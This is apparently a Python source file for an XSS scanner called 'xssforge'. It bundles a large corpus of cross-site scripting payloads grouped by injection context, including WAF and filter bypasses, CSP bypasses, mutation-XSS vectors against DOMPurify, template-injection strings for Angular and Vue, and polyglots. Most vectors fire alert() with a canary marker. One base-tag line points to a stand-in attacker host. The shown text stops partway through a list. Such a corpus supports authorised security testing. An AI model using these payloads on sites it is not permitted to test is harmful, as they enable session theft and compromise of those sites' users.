"""xssforge payload corpus.

Bundled sources (see tools/build_corpus.py):
  * PortSwigger XSS cheat-sheet vectors            -> corpus/portswigger.txt
  * HexBrain / PayloadsAllTheThings XSS passages   -> corpus/hexbrain.txt
  * PortSwigger 2026 cheat-sheet update (110 new
    event/attribute/vue/mXSS vectors)              -> corpus/2026-update.txt
  * PortSwigger cheat-sheet refresh, 2026-11-24
    (202 additional vectors)                       -> corpus/cheatsheet-2026.txt
  * curated context, WAF-bypass and encoding seeds -> this file

Runtime placeholders:
  __M__      unique marker token (inside alert)
  __B64__    base64 of alert('__M__')
  __B64DOC__ base64 of <script>alert('__M__')</script>
  __FCC__    JS String.fromCharCode(...) for alert('__M__')
  __CB__     blind/OOB callback URL

`canaryize(payload, token)` inserts the per-scan canary into vectors that ship
with their own call (e.g. alert(1), print(), confirm(document.domain)).
"""
import base64
import binascii
import html
import json
import os
import quopri
import re
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
CORPUS_DIR = os.path.join(HERE, "corpus")


def _load(name):
    path = os.path.join(CORPUS_DIR, name)
    if not os.path.exists(path):
        return []
    out = []
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.rstrip("\n").strip()
            if line:
                out.append(line)
    return out


# ---------------------------------------------------------------------------
# Curated seeds
# ---------------------------------------------------------------------------

CURATED = {
    "html": [
        ("script", "<script>alert('__M__')</script>"),
        ("script-nested", "<scr<script>ipt>alert('__M__')</script>"),
        ("script-cdata", "<script><![CDATA[alert('__M__')]]></script>"),
        ("svg-onload", "<svg onload=alert('__M__')>"),
        ("svg-slash", "<svg/onload=alert('__M__')>"),
        ("img-onerror", "<img src=x onerror=alert('__M__')>"),
        ("img-onerror-slash", "<img src=x onerror=alert('__M__')//>"),
        ("img-onerror-noquote", "<img src=x onerror=alert('__M__') >"),
        ("body-onload", "<body onload=alert('__M__')>"),
        ("details-ontoggle", "<details open ontoggle=alert('__M__')>"),
        ("input-autofocus", "<input autofocus onfocus=alert('__M__')>"),
        ("marquee-onstart", "<marquee onstart=alert('__M__')>"),
        ("video-source", "<video><source onerror=alert('__M__')>"),
        ("audio-onerror", "<audio src=x onerror=alert('__M__')>"),
        ("iframe-srcdoc", "<iframe srcdoc=\"<script>alert('__M__')</script>\">"),
        ("math-mglyph", "<math><mtext><table><mglyph><style><img src=x onerror=alert('__M__')>"),
        ("a-javascript", "<a href=\"javascript:alert('__M__')\">x</a>"),
        ("form-formaction", "<form><button formaction=javascript:alert('__M__')>x"),
        ("select-focus", "<select autofocus onfocus=alert('__M__')>"),
        ("textarea-focus", "<textarea autofocus onfocus=alert('__M__')>"),
        ("xss-tabindex", "<xss id=x tabindex=1 onfocus=alert('__M__')></xss>"),
        ("svg-animate", "<svg><animate onbegin=alert('__M__') attributeName=x dur=1s>"),
        ("svg-set", "<svg><set attributeName=onbegin onbegin=alert('__M__')>"),
        ("object-data", "<object data=\"javascript:alert('__M__')\">"),
        ("embed-src", "<embed src=\"javascript:alert('__M__')\">"),
        ("video-onerror", "<video src=x onerror=alert('__M__')>"),
        ("source-onerror", "<source src=x onerror=alert('__M__')>"),
        ("track-onerror", "<track src=x onerror=alert('__M__')>"),
        ("div-style-anim", "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert('__M__')\"></xss>"),
        ("input-beforematch", "<input type=hidden id=x onbeforematch=alert('__M__') hidden=until-found>"),
        ("object-afterscript", "<object onafterscriptexecute=alert('__M__')>"),
        ("iframe-onload", "<iframe onload=alert('__M__')>"),
        ("meter-onmouseover", "<meter onmouseover=alert('__M__')>meter</meter>"),
        ("base-href-js", "<base href=\"javascript:alert('__M__')//\">"),
        ("meta-refresh", "<meta http-equiv=refresh content=\"0;url=javascript:alert('__M__')\">"),
        ("svg-href", "<svg><a xlink:href=\"javascript:alert('__M__')\"><text>x</text></a></svg>"),
        ("math-href", "<math href=\"javascript:alert('__M__')\">x</math>"),
        ("plaintext-break", "<plaintext><img src=x onerror=alert('__M__')>"),
        ("noscript-break", "<noscript><p title=\"</noscript><img src=x onerror=alert('__M__')>\">"),
        ("template-break", "<template><script>alert('__M__')</script></template>"),
        ("isindex-formaction", "<isindex action=javascript:alert('__M__') type=image>"),
        ("button-formaction", "<button formaction=javascript:alert('__M__')>x</button>"),
        ("input-formaction", "<input type=submit formaction=javascript:alert('__M__')>"),
        ("dialog-open", "<dialog open onfocus=alert('__M__') autofocus>"),
        ("keygen-autofocus", "<keygen autofocus onfocus=alert('__M__')>"),
        ("video-poster", "<video poster=javascript:alert('__M__')>"),
        ("svg-use", "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(\"__M__\")'/></svg>#x\"></use></svg>"),
    ],
    "attr_dq": [
        ("break-script", "\"><script>alert('__M__')</script>"),
        ("break-svg", "\"><svg onload=alert('__M__')>"),
        ("break-img", "\"><img src=x onerror=alert('__M__')>"),
        ("autofocus", "\" autofocus onfocus=\"alert('__M__')"),
        ("onmouseover", "\" onmouseover=\"alert('__M__')"),
        ("onfocus-attr", "\" onfocus=alert('__M__') autofocus=\""),
        ("break-iframe", "\"><iframe src=\"javascript:alert('__M__')\">"),
        ("space-event", "\" onpointerover=\"alert('__M__')\""),
        ("close-tag", "\"><img src=x onerror=alert('__M__')//>"),
        ("entity-break", "\"&#x3e;&#x3c;svg onload=alert('__M__')>"),
        ("backtick", "`><svg onload=alert('__M__')>"),
        ("newline-break", "\n\"><script>alert('__M__')</script>"),
        ("formaction-break", "\" formaction=\"javascript:alert('__M__')\""),
        ("srcdoc-break", "\" srcdoc=\"<script>alert('__M__')</script>\""),
    ],
    "attr_sq": [
        ("break-script", "'><script>alert('__M__')</script>"),
        ("break-svg", "'><svg onload=alert('__M__')>"),
        ("break-img", "'><img src=x onerror=alert('__M__')>"),
        ("autofocus", "' autofocus onfocus='alert('__M__')"),
        ("onmouseover", "' onmouseover='alert('__M__')"),
        ("close-tag", "'><img src=x onerror=alert('__M__')//>"),
        ("newline-break", "\n'><script>alert('__M__')</script>"),
        ("entity-break", "'&#x3e;&#x3c;svg onload=alert('__M__')>"),
        ("formaction-break", "' formaction='javascript:alert('__M__')'"),
    ],
    "attr_unquoted": [
        ("onmouseover", " onmouseover=alert('__M__') "),
        ("autofocus", " autofocus onfocus=alert('__M__') "),
        ("break-script", "><script>alert('__M__')</script>"),
        ("break-svg", "><svg onload=alert('__M__')>"),
        ("tab-event", "\tonpointerover=alert('__M__') "),
        ("slash-event", "/onmouseover=alert('__M__') "),
    ],
    "script": [
        ("single-quote", "';alert('__M__');//"),
        ("double-quote", "\";alert('__M__');//"),
        ("close-tag", "</script><script>alert('__M__')</script>"),
        ("close-svg", "</script><svg onload=alert('__M__')>"),
        ("backslash", "\\';alert('__M__')//"),
        ("template", "${alert('__M__')}"),
        ("concat", "'+alert('__M__')+'"),
        ("brace", "};alert('__M__');//"),
        ("array", "];alert('__M__');//"),
        ("html-comment", "<!--<script>alert('__M__')</script>-->"),
        ("breakout-dq", "\";alert('__M__');//"),
        ("breakout-sq", "';alert('__M__');//"),
        ("newline", "\nalert('__M__')//"),
        ("eval", "';eval('alert(\\'__M__\\')')//"),
        ("function", "';Function('alert(\\'__M__\\')')()//"),
        ("template-literal", "`${alert('__M__')}`"),
        ("regex", "/x/;alert('__M__');//"),
    ],
    "url": [
        ("js-scheme", "javascript:alert('__M__')"),
        ("js-comment", "javascript:alert('__M__')//"),
        ("js-tab", "java\tscript:alert('__M__')"),
        ("js-newline", "java\nscript:alert('__M__')"),
        ("js-cr", "java\rscript:alert('__M__')"),
        ("js-case", "JaVaScRiPt:alert('__M__')"),
        ("js-entity-colon", "javascript&colon;alert('__M__')"),
        ("js-entity-colon2", "javascript&#58;alert('__M__')"),
        ("js-entity-colon3", "javascript&#x3a;alert('__M__')"),
        ("data-html", "data:text/html,<script>alert('__M__')</script>"),
        ("data-b64", "data:text/html;base64,__B64__"),
        ("data-b64doc", "data:text/html;base64,__B64DOC__"),
        ("html-entity", "&#106;avascript:alert('__M__')"),
        ("html-entity-full", "&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert('__M__')"),
        ("js-with-tab-entity", "java&Tab;script:alert('__M__')"),
        ("js-lead-space", " javascript:alert('__M__')"),
        ("vbscript", "vbscript:msgbox('__M__')"),
    ],
    "css": [
        ("break-style", "</style><script>alert('__M__')</script>"),
        ("break-img", "</style><img src=x onerror=alert('__M__')>"),
        ("expression", "expression(alert('__M__'))"),
        ("url-js", "background:url(javascript:alert('__M__'))"),
        ("import", "@import 'javascript:alert(\\'__M__\\')';"),
        ("moz-binding", "-moz-binding:url(data:text/xml,<bindings><binding><handler>alert('__M__')</handler></binding></bindings>#x);"),
    ],
    "comment": [
        ("break", "--><script>alert('__M__')</script><!--"),
        ("break-svg", "--!><svg onload=alert('__M__')>"),
        ("break-short", "--><img src=x onerror=alert('__M__')>"),
        ("conditional", "--><script><!--\nalert('__M__')\n//--></script>"),
    ],
    "svg": [
        ("script", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert('__M__')</script></svg>"),
        ("onload", "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('__M__')\"/>"),
        ("foreign", "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><img src=x onerror=alert('__M__')></body></foreignObject></svg>"),
        ("xlink", "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><a xlink:href=\"javascript:alert('__M__')\"><text>x</text></a></svg>"),
        ("animate", "<svg><a><animate attributeName=href values=javascript:alert('__M__') /></a></svg>"),
        ("set", "<svg><set attributeName=onmouseover onmouseover=alert('__M__')>"),
        ("discard", "<svg><discard onbegin=alert('__M__')>"),
        ("handler", "<svg><handler onbegin=alert('__M__')>"),
    ],
    "mxss": [
        ("nesting", "<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=. onerror=alert('__M__')>"),
        ("noscript", "<noscript><p title=\"</noscript><img src=x onerror=alert('__M__')>\">"),
        ("style", "<style><img src=x onerror=alert('__M__')></style>"),
        ("foreign", "<svg><foreignObject><img src=x onerror=alert('__M__')></foreignObject></svg>"),
        ("is-attr", "<math><foo style>a<foo bar=\"><img src=x onerror=alert('__M__')>\"></foo></math>"),
        ("xmp", "<xmp><img src=x onerror=alert('__M__')></xmp>"),
        ("svg-style", "<svg></p><style><a id=\"</style><img src=1 onerror=alert('__M__')>\">"),
        ("table-nesting", "<table><math><mtext></table><img src=x onerror=alert('__M__')>"),
        ("textarea", "<textarea></textarea><img src=x onerror=alert('__M__')>"),
    ],
    "csp": [
        ("formaction", "<form id=t><button form=t formaction=javascript:alert('__M__')>x</button></form>"),
        ("input-autofocus", "<input autofocus onfocus=alert('__M__')>"),
        ("details", "<details open ontoggle=alert('__M__')>"),
        ("base", "<base href=\"javascript:alert('__M__')//\">"),
        ("svg-animate", "<svg><a><animate attributeName=href values=javascript:alert('__M__') /></a></svg>"),
        ("jsonp-google", "<script/src=//google.com/complete/search?client=chrome%26jsonp=alert('__M__');>"),
        ("jsonp-youtube", "<script src=https://www.youtube.com/oembed?callback=alert('__M__');>"),
        ("data-script", "<script src=\"data:,alert('__M__')\">/</script>"),
    ],
    "waf": [
        ("case", "<ScRiPt>alert('__M__')</ScRiPt>"),
        ("nested", "<scr<script>ipt>alert('__M__')</script>"),
        ("slash", "<svg/onload=alert('__M__')>"),
        ("concat", "<img src=x onerror=\"window['ale'+'rt']('__M__')\">"),
        ("charcode", "<img src=x onerror=eval(String.fromCharCode(__FCC__))>"),
        ("base64", "<svg onload=eval(atob('__B64__'))>"),
        ("unicode", "<img src=x onerror=\\u0061lert('__M__')>"),
        ("top", "<img src=x onerror=top['ale'+'rt']('__M__')>"),
        ("fromcharcode-script", "<script>eval(String.fromCharCode(__FCC__))</script>"),
        ("comment-tag", "<scr<!---->ipt>alert('__M__')</scr<!---->ipt>"),
        ("comment-attr", "<img src=x on/**/error=alert('__M__')>"),
        ("slash-attr", "<img/src=x/onerror=alert('__M__')>"),
        ("tab-attr", "<img\tsrc=x\tonerror=alert('__M__')>"),
        ("newline-attr", "<img\nsrc=x\nonerror=alert('__M__')>"),
        ("cr-attr", "<img\rsrc=x\ronerror=alert('__M__')>"),
        ("formfeed-attr", "<img\fsrc=x\fonerror=alert('__M__')>"),
        ("null-attr", "<img src=x onerror=alert('__M__')%00>"),
        ("vt-event", "<img src=x onerror\x0b=alert('__M__')>"),
        ("entity-lt", "&lt;script&gt;alert('__M__')&lt;/script&gt;"),
        ("entity-call", "<svg onload=&#97;&#108;&#101;&#114;&#116;('__M__')>"),
        ("hex-entity-call", "<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;('__M__')>"),
        ("no-semicolon-entity", "<svg onload=&#97&#108&#101&#114&#116('__M__')>"),
        ("backtick", "<img src=x onerror=eval(`alert('__M__')`)>"),
        ("parenless", "<svg onload=alert`__M__`>"),
        ("throw-onerror", "<script>onerror=alert;throw '__M__'</script>"),
        ("constructor", "<img src=x onerror=constructor.constructor('alert(\"__M__\")')()>"),
        ("settimeout", "<img src=x onerror=setTimeout('alert(\"__M__\")',0)>"),
        ("template-literal", "<svg onload=alert`__M__`>"),
        ("utf7-data", "<iframe src=\"data:text/html;charset=utf-7,+ADw-script+AD4-alert('__M__')+ADw-/script+AD4-\"></iframe>"),
        ("unicode-fullwidth", "\uff1cscript/src=//x.invalid/x.js\uff1e"),
        ("jsfuck-call", "<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]])()</script>"),
    ],
    "polyglot": [
        ("universal-0xsobky", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('__M__') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('__M__')//>\\x3e"),
        ("universal-0x", "'\"><svg/onload=alert('__M__')><script>alert('__M__')</script>"),
        ("ashar-javed", "\">><marquee><img src=x onerror=alert('__M__')></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\">"),
        ("mathias-karlsson", "\" onclick=alert('__M__')//<button ' onclick=alert('__M__')//> */ alert('__M__')//"),
        ("s0md3v", "--'\"'/></sCript><svG x=\">\" onload=(co\\u006efirm)`__M__`>"),
        ("filedescriptor", "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert('__M__')//>"),
        ("brutelogic", "JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)('__M__')}//><Base/Href=//X55.is\\76-->"),
        ("multi", "';alert('__M__')//\";alert('__M__')//--></SCRIPT>\">'><SCRIPT>alert('__M__')</SCRIPT>"),
    ],
    "angular": [
        ("csti-basic", "{{constructor.constructor('alert(\"__M__\")')()}}"),
        ("csti-eval", "{{$eval.constructor('alert(\"__M__\")')()}}"),
        ("csti-tostring", "{{toString.constructor('alert(\"__M__\")')()}}"),
        ("csti-on", "{{$on.constructor('alert(\"__M__\")')()}}"),
        ("ng-app", "<div ng-app>{{constructor.constructor('alert(\"__M__\")')()}}</div>"),
        ("ng-bind-html", "<div ng-bind-html=\"'<img src=x onerror=alert(__M__)>'\"></div>"),
        ("no-quotes", "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}"),
    ],
    "vue": [
        ("csti-basic", "{{constructor.constructor('alert(\"__M__\")')()}}"),
        ("v3-underscore", "{{_c.constructor('alert(\"__M__\")')()}}"),
        ("v3-parse", "{{_v.constructor('alert(\"__M__\")')()}}"),
        ("v-html", "<div v-html=\"'<img src=x onerror=alert(__M__)>'\"></div>"),
        ("v-bind", "<div :title=\"'<img src=x onerror=alert(__M__)>'\">x</div>"),
    ],
    "dom": [
        # immediate alert() from a data: script can hang headless Chromium;
        # deferring it fires correctly and produces the game's alert proof.
        ("gadget-alert", "data:text/javascript,setTimeout(function(){alert('__M__')},100)"),
        ("gadget-console", "data:text/javascript,console.log('__M__')"),
        ("gadget-title", "data:text/javascript,document.title='__M__'"),
        ("gadget-throw", "data:text/javascript,throw '__M__'"),
        ("gadget-base64-console", "data:text/javascript;base64,__B64C__"),
        ("hash-img", "#<img src=x onerror=alert('__M__')>"),
        ("hash-svg", "#<svg onload=alert('__M__')>"),
        ("hash-js", "javascript:alert('__M__')"),
        ("innerhtml-img", "<img src=x onerror=alert('__M__')>"),
        ("unicode", "\\u003cimg src=x onerror=alert('__M__')\\u003e"),
        ("doc-write", "<script>document.write('<img src=x onerror=alert(\"__M__\")>')</script>"),
        ("eval-string", "<svg onload=eval('alert(\"__M__\")')>"),
        ("iframe-srcdoc", "<iframe srcdoc=\"<script>alert('__M__')</script>\">"),
        ("iframe-data", "<iframe src=\"data:text/html,<script>alert('__M__')</script>\">"),
    ],
    "prototype": [
        ("proto-canary", "__proto__[canary]=__M__"),
        ("proto-innerhtml", "__proto__[innerHTML]=<img src=x onerror=alert('__M__')>"),
        ("proto-hitcallback", "__proto__[hitCallback]=alert('__M__')"),
        ("proto-sequence", "__proto__[sequence]=alert('__M__')-"),
        ("ctor-canary", "constructor[prototype][canary]=__M__"),
        ("proto-json", "{\"__proto__\":{\"canary\":\"__M__\"}}"),
        ("proto-src", "__proto__[src]=javascript:alert('__M__')"),
        ("proto-url", "__proto__[url]=javascript:alert('__M__')"),
    ],
    "postmessage": [
        ("iframe-basic", "<iframe src=/ id=v></iframe><script>v.onload=function(){v.contentWindow.postMessage(\"<img src=x onerror=alert('__M__')>\",'*')}</script>"),
        ("json-clevertap", "{\"display\":{\"details\":[{\"html\":\"<img src=x onerror=alert('__M__')>\",\"templateType\":\"custom-html\",\"type\":5}]}}"),
        ("popup", "<script>w=open('/');setTimeout(function(){w.postMessage(\"<svg onload=alert('__M__')>\",\"*\")},2000)</script>"),
    ],
    "jsonp": [
        ("jsonp-callback", "<script src=\"//trusted.cdn/jsonp?callback=alert(__M__)//\"></script>"),
        ("gadget-angular", "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js\"></script><div ng-app>{{constructor.constructor('alert(\"__M__\")')()}}</div>"),
        ("gadget-prototype", "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js\"></script><img src=x onerror=alert(__M__)>"),
        ("base-hijack", "<base href=\"//attacker.invalid/\">"),
    ],
    "markdown": [
        ("link-js", "[x](javascript:alert('__M__'))"),
        ("link-js-angle", "[x](<javascript:alert('__M__')>)"),
        ("img-onerror", "![x](x\" onerror=\"alert('__M__')\")"),
        ("data-uri", "[x](data:text/html,<script>alert('__M__')</script>)"),
        ("refdef", "[x][a]\n\n[a]: javascript:alert('__M__')"),
        ("html-inline", "<img src=x onerror=alert('__M__')>"),
    ],
    "file": [
        ("svg-onload", "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('__M__')\"/>"),
        ("svg-script", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert('__M__')</script></svg>"),
        ("svg-xlink", "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><a xlink:href=\"javascript:alert('__M__')\"><text>x</text></a></svg>"),
        ("html-file", "<html><body><script>alert('__M__')</script></body></html>"),
        ("xhtml-file", "<html xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert('__M__')</script></html>"),
    ],
    "encoding": [
        ("url-basic", "%3Cscript%3Ealert('__M__')%3C/script%3E"),
        ("url-svg", "%3Csvg%20onload%3Dalert('__M__')%3E"),
        ("url-img", "%3Cimg%20src%3Dx%20onerror%3Dalert('__M__')%3E"),
        ("url-double", "%253Cscript%253Ealert('__M__')%253C%252Fscript%253E"),
        ("url-js-scheme", "javascript%3Aalert('__M__')"),
        ("html-entity-event", "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;('__M__')\">"),
        ("html-hex-event", "<svg onload=\"&#x61;&#x6c;&#x65;&#x72;&#x74;('__M__')\">"),
        ("html-colon-scheme", "<a href=\"javascript&colon;alert('__M__')\">x</a>"),
        ("js-unicode", "<script>\\u0061lert('__M__')</script>"),
        ("js-hex", "<script>\\x61lert('__M__')</script>"),
        ("js-unicode-attr", "<svg onload=\"\\u0061lert('__M__')\">"),
        ("b64-atob", "<svg onload=\"eval(atob('__B64__'))\">"),
        ("b64-data-iframe", "<iframe src=\"data:text/html;base64,__B64DOC__\"></iframe>"),
        ("b64-eval-script", "<script>eval(atob('__B64__'))</script>"),
        ("fromcharcode", "<script>String.fromCharCode(__FCC__)</script>"),
        ("octal", "javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'"),
        ("utf16be", "%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E"),
    ],
}
CURATED["rcdata"] = [
    ("break-textarea", "</textarea><script>alert('__M__')</script>"),
    ("break-textarea-svg", "</textarea><svg onload=alert('__M__')>"),
    ("break-title", "</title><script>alert('__M__')</script>"),
    ("break-title-svg", "</title><svg onload=alert('__M__')>"),
    ("break-xmp", "</xmp><img src=x onerror=alert('__M__')>"),
    ("break-noscript", "</noscript><img src=x onerror=alert('__M__')>"),
    ("break-noembed", "</noembed><script>alert('__M__')</script>"),
    ("break-noframes", "</noframes><svg onload=alert('__M__')>"),
    ("break-plaintext", "</plaintext><script>alert('__M__')</script>"),
    ("break-iframe", "</iframe><script>alert('__M__')</script>"),
]

CURATED["firewall"] = CURATED["waf"]

# ---------------------------------------------------------------------------
# Real-world / disclosed-bug vectors (2025-2026) drawn from public writeups.
# Sources: DOMPurify rawtext re-contextualization mXSS (CVE-2026-0540 /
# CVE-2026-3126 / CVE-2026-65914, Fluid Attacks + caverav + cure53 wiki),
# Google Search noscript mXSS (Masato Kinugawa), mizu.re DOMPurify
# misconfiguration research, PortSwigger XSS contexts 2026, BBLabs mXSS notes.
# Kept separate so provenance is clear; merged into categories in _build().
# ---------------------------------------------------------------------------

REALWORLD_2026 = {
    "mxss": [
        # DOMPurify rawtext/RCDATA re-contextualization (SAFE_FOR_XML gap).
        ("dp-xmp-recontext", "<img src=x alt=\"</xmp><img src=x onerror=alert('__M__')>\">"),
        ("dp-noscript-recontext", "<noscript><p title=\"</noscript><img src=x onerror=alert('__M__')>\">"),
        ("dp-textarea-recontext", "<textarea><p title=\"</textarea><img src=x onerror=alert('__M__')>\">"),
        ("dp-iframe-recontext", "<iframe><p title=\"</iframe><img src=x onerror=alert('__M__')>\">"),
        ("dp-noembed-recontext", "<noembed><p title=\"</noembed><img src=x onerror=alert('__M__')>\">"),
        ("dp-noframes-recontext", "<noframes><p title=\"</noframes><img src=x onerror=alert('__M__')>\">"),
        # Attribute / style context re-parse.
        ("dp-style-attr", "<style>a[href=\"</style><img src=x onerror=alert('__M__')\">\"] {}</style>"),
        ("dp-div-textarea", "<div id=\"</textarea><img src=x onerror=alert('__M__')>\"></div>"),
        # Google Search noscript mXSS (scripting-flag parse differential).
        ("google-noscript", "<noscript><a alt=\"</noscript><img src onerror=alert('__M__')\">\">Hello</a></noscript>"),
    ],
    "html": [
        ("foreignobject-iframe", "<svg><foreignObject><iframe src=javascript:alert('__M__')></iframe></foreignObject></svg>"),
        ("math-mi-href", "<math><mi xlink:href=\"javascript:alert('__M__')\">click</mi></math>"),
        ("comment-broken", "<!--><img src=x onerror=alert('__M__')>"),
        ("svg-title-break", "<svg><p title=\"</title><img src=x onerror=alert('__M__')\">\"></p></svg>"),
    ],
    "attr_dq": [
        ("autofocus-repair", "\" autofocus onfocus=alert('__M__') x=\""),
        ("onformdata", "\" onformdata=alert('__M__') x=\""),
        ("style-cv", "\" style=content-visibility:auto oncontentvisibilityautostatechange=alert('__M__') x=\""),
    ],
    "attr_sq": [
        ("autofocus-repair", "' autofocus onfocus=alert('__M__') x='"),
        ("apos-entity", "&apos;-alert('__M__')-&apos;"),
        ("onbeforetoggle", "' onbeforetoggle=alert('__M__') x='"),
    ],
    "attr_unquoted": [
        ("autofocus-repair", " autofocus onfocus=alert('__M__') x="),
        ("onformdata", " onformdata=alert('__M__') x="),
    ],
    "script": [
        ("minus-break", "'-alert('__M__')-'"),
        ("throw-no-parens", "onerror=alert;throw'__M__'"),
        ("close-tag-img", "</script><img src=1 onerror=alert('__M__')>"),
    ],
    "comment": [
        ("broken-open", "<!--><img src=x onerror=alert('__M__')>"),
        ("broken-open-end", "<!--><svg onload=alert('__M__')>-->"),
    ],
    "csp": [
        ("meta-refresh-data", "<meta http-equiv=refresh content=\"0;url=data:text/html,<script>alert('__M__')</script>\">"),
        ("base-js-prefix", "<base href=\"javascript:/a/-alert('__M__')//\">"),
        ("data-js-src", "<script src=\"data:text/javascript,alert('__M__')\"></script>"),
        ("svg-use-data", "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href=1 onerror=alert('__M__')/></svg>#x\">"),
    ],
    "waf": [
        ("svg-confirm", "<svg onload=confirm('__M__')>"),
        ("svg-prompt", "<svg onload=prompt('__M__')>"),
        ("body-pageshow", "<body onpageshow=alert('__M__')>"),
        ("details-toggle", "<details open ontoggle=alert('__M__')>"),
        ("svg-slash-event", "<svg/onload=alert('__M__')//>"),
    ],
    "url": [
        ("js-comment-poly", "javascript:/*--></title></style></textarea></script><svg/onload=alert('__M__')//"),
        ("data-svg", "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload=alert('__M__')>"),
    ],
    "markdown": [
        ("img-onerror", "![x](x\"onerror=\"alert('__M__'))"),
        ("link-js-entity", "[x](javascript&colon;alert('__M__'))"),
    ],
    "dom": [
        ("svg-use-data", "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href=1 onerror=alert('__M__')/></svg>#x\">"),
    ],
}


# ---------------------------------------------------------------------------
# 2026 vectors: modern event handlers, popover API, hidden-input escape,
# mXSS parser-differential and framework escape hatches.
# Sources: PortSwigger XSS cheat sheet 2026, chs.us context guide,
# jekil.sexy hidden-input research, DOMPurify CVE-2025-26791.
# ---------------------------------------------------------------------------

MODERN_VECTORS = [
    ("cv-hidden", "<input type=hidden oncontentvisibilityautostatechange=alert('__M__') style=content-visibility:auto>"),
    ("cv-all", "<xss style=display:block;content-visibility:auto oncontentvisibilityautostatechange=alert('__M__')>"),
    ("cv-div", "<div style=content-visibility:auto oncontentvisibilityautostatechange=alert('__M__')>"),
    ("cv-tags", "<a style=content-visibility:auto oncontentvisibilityautostatechange=alert('__M__')>x</a>"),
    ("popover-toggle", "<button popovertarget=x>Click</button><div popover id=x ontoggle=alert('__M__')>XSS</div>"),
    ("popover-before", "<button popovertarget=x>Click</button><div popover id=x onbeforetoggle=alert('__M__')>XSS</div>"),
    ("popover-hidden", "\" id=x popover onbeforetoggle=alert('__M__') x=\""),
    ("popover-hidden-toggle", "\" id=x popover ontoggle=alert('__M__') x=\""),
    ("popover-meta", "<meta id=x popover onbeforetoggle=alert('__M__')>"),
    ("popover-any", "<* onbeforetoggle=alert('__M__') popover id=x>XSS</*>"),
    ("onbeforematch", "<input type=hidden id=x onbeforematch=alert('__M__') hidden=until-found>"),
    ("dialog-cancel", "<dialog open oncancel=alert('__M__')>"),
    ("dialog-close", "<dialog open onclose=alert('__M__')>"),
    ("dialog-command", "<dialog open oncommand=alert('__M__')>"),
    ("mxss-math-style", "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert('__M__')>\">"),
    ("mxss-cdata", "<math><mtext><table><mglyph><style><![CDATA[</style><img title=\"]]><img src=1 onerror=alert('__M__')>\">"),
    ("svg-animate-href", "<svg><a><animate attributeName=href values=javascript:alert('__M__') /></a></svg>"),
    ("svg-animate-begin", "<svg><animate onbegin=alert('__M__') attributeName=x dur=1s>"),
    ("svg-set-begin", "<svg><set attributeName=x onbegin=alert('__M__')>"),
    ("svg-use-href", "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(\\'__M__\\')'/></svg>#x\"></use></svg>"),
    ("iframe-srcdoc-script", "<iframe srcdoc=\"<script>alert('__M__')</script>\">"),
    ("iframe-srcdoc-entity", "<iframe srcdoc=\"&lt;script&gt;alert('__M__')&lt;/script&gt;\">"),
    ("meta-refresh-js", "<meta http-equiv=refresh content=\"0;url=javascript:alert('__M__')\">"),
    ("object-data-js", "<object data=javascript:alert('__M__')>"),
    ("embed-js", "<embed src=javascript:alert('__M__')>"),
    ("form-action-js", "<form action=javascript:alert('__M__')><input type=submit>"),
    ("button-formaction", "<button formaction=javascript:alert('__M__')>x"),
